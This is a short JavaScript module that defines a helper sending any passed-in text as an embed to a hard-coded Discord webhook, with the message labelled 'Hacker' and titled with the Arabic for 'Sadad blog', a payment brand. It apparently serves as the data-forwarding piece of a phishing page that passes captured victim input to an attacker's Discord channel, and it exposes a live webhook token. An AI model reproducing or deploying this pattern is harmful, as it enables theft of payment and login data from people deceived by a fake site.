import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329849235314839687/ulfuNjT-qQm4t3PLnqR7-tbTPliw4gKpN6h-xkSouv4JGXRN7I6-jsz5or0eBOhXbBKz",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
